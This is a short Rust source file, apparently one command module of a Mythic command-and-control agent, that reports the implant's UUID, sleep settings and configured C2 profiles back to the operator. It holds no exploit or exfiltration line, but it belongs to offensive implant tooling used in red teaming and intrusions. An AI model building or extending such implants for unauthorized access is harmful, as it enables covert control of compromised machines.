use crate::profiles;
use crate::structs::Task;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let uuid = profiles::get_mythic_id();
    let sleep_info = profiles::get_sleep_string();
    let c2_info = profiles::get_all_c2_info();
    response.user_output = format!("UUID: {}\nSleep Info:\n{}\nC2 Profiles:\n{}", uuid, sleep_info, c2_info);
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
